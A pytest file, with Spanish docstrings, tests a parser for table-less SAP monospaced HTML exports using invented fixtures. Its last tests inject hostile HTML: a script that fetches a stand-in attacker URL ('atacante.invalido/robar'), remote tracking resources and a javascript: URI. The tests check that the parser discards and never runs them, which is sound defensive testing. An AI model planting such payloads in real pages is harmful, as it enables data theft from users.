"""Export de SAP en formato de lista monoespaciada, sin tablas HTML.

SAP exporta estas listas de dos formas y ésta es la que **no** tiene
``<table>``: una sucesión de ``<nobr>…</nobr><br>`` en fuente de ancho fijo,
con las columnas dibujadas con espacios y el tipo de cada renglón indicado
por un icono. Un parser que exija tablas no ve absolutamente nada aquí.

Todo el contenido de estos fixtures es inventado: los códigos, las
ubicaciones y las descripciones no corresponden a ningún equipo real. Los
identificadores de fila se eligen a propósito distintos de los de cualquier
export real, para que ningún test pueda depender de ellos.
"""

from datetime import date
from decimal import Decimal

import pytest

from elsa.ingestion.errors import UnrecognizedFormatError
from elsa.ingestion.model import ParsedSapSnapshot
from elsa.ingestion.sap_htm import parse_sap_snapshot

HEADER = (
    '<nobr id="zz0001">Ubic.t&eacute;cn.&nbsp;&nbsp;MB-FICTICIA-01&nbsp;&nbsp;&nbsp;&nbsp;'
    "Denominaci&oacute;n&nbsp;&nbsp;Conjunto ficticio</nobr><br>\n"
    '<nobr id="zz0002">V&aacute;lido de&nbsp;&nbsp;&nbsp;&nbsp;15.03.2026</nobr><br>\n'
)
COLUMNS = (
    '<nobr id="zz0003">Nivel  Objeto            Denominaci&oacute;n            '
    "Ctd.      UM</nobr><br>\n"
)
EQUIPMENT = (
    '<nobr id="zz0004">  1    <img src="s_b_equi.gif" title="Equipo">EQ-9001   '
    "Subconjunto ficticio    1        ST</nobr><br>\n"
)
MATERIALS = (
    '<nobr id="zz0005">  2    <img src="s_b_matl.gif" title="Material">90000001  '
    "Pieza ficticia A        2        UN</nobr><br>\n"
    '<nobr id="zz0006">  2    <img src="s_b_matl.gif" title="Material">90000002  '
    "Pieza ficticia B       10        UN</nobr><br>\n"
)


def _document(body: str) -> bytes:
    return (
        '<html><head><meta charset="utf-8"></head><body>'
        '<font face="Courier New" size="2">\n' + body + "</font></body></html>"
    ).encode("utf-8")


@pytest.fixture
def snapshot() -> ParsedSapSnapshot:
    return parse_sap_snapshot(_document(HEADER + COLUMNS + EQUIPMENT + MATERIALS))


def test_an_export_without_any_table_is_parsed(snapshot: ParsedSapSnapshot) -> None:
    """Es el defecto que motivó esta corrección: antes no se leía nada."""
    assert len(snapshot.items) == 3


def test_the_functional_location_is_read_from_an_abbreviated_label(
    snapshot: ParsedSapSnapshot,
) -> None:
    """SAP abrevia con punto y sin espacio: `Ubic.técn.`."""
    assert snapshot.functional_location == "MB-FICTICIA-01"


def test_the_description_is_read(snapshot: ParsedSapSnapshot) -> None:
    assert snapshot.description == "Conjunto ficticio"


def test_the_valid_from_date_is_read(snapshot: ParsedSapSnapshot) -> None:
    assert snapshot.valid_from == date(2026, 3, 15)


def test_materials_are_read_with_quantity_and_unit(snapshot: ParsedSapSnapshot) -> None:
    material = snapshot.materials[0]

    assert material.sap_code == "90000001"
    assert material.description == "Pieza ficticia A"
    assert material.quantity == Decimal(2)
    assert material.unit == "UN"


def test_decimal_quantities_are_read() -> None:
    line = (
        '<nobr>  2    <img title="Material">90000003  Pieza ficticia C      1,5      KG</nobr><br>'
    )
    snapshot = parse_sap_snapshot(_document(HEADER + COLUMNS + line))

    assert snapshot.materials[0].quantity == Decimal("1.5")
    assert snapshot.materials[0].unit == "KG"


def test_child_equipments_are_kept_apart_from_materials(snapshot: ParsedSapSnapshot) -> None:
    assert len(snapshot.materials) == 2
    assert len(snapshot.equipments) == 1
    assert snapshot.equipments[0].sap_code == "EQ-9001"


def test_the_hierarchy_is_preserved(snapshot: ParsedSapSnapshot) -> None:
    """Los materiales cuelgan del equipo que los precede."""
    assert snapshot.equipments[0].depth == 1
    assert all(item.depth == 2 for item in snapshot.materials)
    assert all(item.extra["parent_code"] == "EQ-9001" for item in snapshot.materials)


def test_different_row_identifiers_do_not_change_the_result(
    snapshot: ParsedSapSnapshot,
) -> None:
    """Los `id` cambian entre exportaciones; atarse a ellos sería frágil."""
    renamed = (HEADER + COLUMNS + EQUIPMENT + MATERIALS).replace('id="zz000', 'id="l00600')

    other = parse_sap_snapshot(_document(renamed))

    assert [item.sap_code for item in other.items] == [item.sap_code for item in snapshot.items]


def test_an_export_without_a_column_header_still_parses() -> None:
    """Sin fila de rótulos, manda la forma del renglón y el icono."""
    snapshot = parse_sap_snapshot(_document(HEADER + EQUIPMENT + MATERIALS))

    assert len(snapshot.materials) == 2
    assert len(snapshot.equipments) == 1


def test_a_metadata_line_is_not_mistaken_for_the_column_header(
    snapshot: ParsedSapSnapshot,
) -> None:
    """`Denominación` es rótulo de campo y de columna a la vez.

    Si la línea de metadatos pasa por cabecera, la cabecera real cae en la
    zona de datos y se importa como si fuera un renglón.
    """
    assert all(item.sap_code not in ("NIVEL", "OBJETO") for item in snapshot.items)


def test_html_without_closing_tags_still_parses() -> None:
    broken = (HEADER + COLUMNS + EQUIPMENT + MATERIALS).replace("</nobr>", "")

    snapshot = parse_sap_snapshot(_document(broken))

    assert len(snapshot.materials) == 2


def test_html_entities_and_unicode_survive() -> None:
    line = (
        '<nobr>  2    <img title="Material">90000004  V&aacute;lvula &frac12;" ficticia'
        "      1        UN</nobr><br>"
    )
    snapshot = parse_sap_snapshot(_document(HEADER + COLUMNS + line))

    assert snapshot.materials[0].description == 'Válvula ½" ficticia'


def test_the_type_is_taken_from_the_declared_title_not_the_image_name() -> None:
    """Atarse a `s_b_matl.gif` rompería en cuanto SAP renombrara sus iconos."""
    line = (
        '<nobr>  2    <img src="/sap/public/otro-nombre.png" title="Material">90000005  '
        "Pieza ficticia D      3        UN</nobr><br>"
    )
    snapshot = parse_sap_snapshot(_document(HEADER + COLUMNS + line))

    assert len(snapshot.materials) == 1


def test_a_material_line_is_recognised_without_any_icon() -> None:
    """Cantidad y unidad son evidencia estructural suficiente."""
    line = "<nobr>  2    90000006  Pieza ficticia E      4        UN</nobr><br>"
    snapshot = parse_sap_snapshot(_document(HEADER + COLUMNS + line))

    assert len(snapshot.materials) == 1
    assert snapshot.materials[0].quantity == Decimal(4)


def test_a_material_without_a_readable_quantity_is_reported_not_guessed() -> None:
    line = '<nobr>  2    <img title="Material">90000007  Pieza ficticia F      s/d      </nobr><br>'
    snapshot = parse_sap_snapshot(_document(HEADER + COLUMNS + line))

    codes = {warning.code for warning in snapshot.warnings}
    assert "incomplete_material_lines" in codes
    assert snapshot.materials[0].quantity is None


def test_scripts_are_never_executed_and_their_content_is_discarded() -> None:
    hostile = (
        "<script>fetch('http://atacante.invalido/robar')</script>" + HEADER + COLUMNS + MATERIALS
    )

    snapshot = parse_sap_snapshot(_document(hostile))

    assert "script_content_ignored" in {warning.code for warning in snapshot.warnings}
    assert all("atacante" not in (item.description or "") for item in snapshot.items)


def test_remote_resources_are_reported_and_never_requested() -> None:
    hostile = (
        '<img src="http://remoto.invalido/pixel.gif">'
        '<link rel="stylesheet" href="https://remoto.invalido/x.css">'
        '<iframe src="https://remoto.invalido/marco"></iframe>' + HEADER + COLUMNS + MATERIALS
    )

    snapshot = parse_sap_snapshot(_document(hostile))

    warning = next(w for w in snapshot.warnings if w.code == "remote_references_ignored")
    assert "3" in (warning.location or "")


def test_a_javascript_uri_is_never_followed() -> None:
    hostile = '<a href="javascript:alert(1)">x</a>' + HEADER + COLUMNS + MATERIALS

    snapshot = parse_sap_snapshot(_document(hostile))

    assert len(snapshot.materials) == 2


def test_an_export_with_nothing_recognisable_still_fails_safely() -> None:
    with pytest.raises(UnrecognizedFormatError):
        parse_sap_snapshot(_document("<nobr>Informe sin estructura</nobr><br>"))
